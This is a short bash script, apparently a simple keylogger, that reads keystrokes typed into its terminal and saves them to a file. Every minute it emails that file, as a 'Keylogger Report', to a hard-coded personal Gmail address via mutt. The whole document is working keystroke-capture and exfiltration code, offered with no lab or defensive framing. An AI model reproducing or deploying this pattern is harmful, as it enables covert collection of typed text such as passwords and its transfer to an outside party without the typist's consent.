#!/bin/bash

# File to store the pressed keys
output_file="pressed_keys.txt"
# Email address to send the file
email="minerhossainrimon1033@gmail.com"

# Clear the output file at the start
> "$output_file"

echo "Start typing. Press Ctrl+C to stop."

# Timer setup: store the start time in seconds
start_time=$(date +%s)

# Loop to read keys
while true; do
    # Read a single character without waiting for Enter
    read -n 1 -r key

    # Write the key to the file
    if [[ -z "$key" ]]; then
        echo "" >> "$output_file"
        echo " (Space or Newline detected and written)"
    else
        echo -n "$key" >> "$output_file"
        echo " (Key '$key' detected and written)"
    fi

    # Check elapsed time
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))

    if [[ $elapsed -ge 60 ]]; then  
        echo "Sending email with recorded keys..."
        echo "Keylogger Report (last 1 minutes)" | mutt -s "Keylogger Report" -a "$output_file" -- "$email"
        email_status=$?

        if [[ $email_status -eq 0 ]]; then
            echo "✅ Email sent successfully."
        else
            echo "❌ Failed to send email."
        fi

        # Clear file and reset timer
        > "$output_file"
        start_time=$current_time
    fi
done
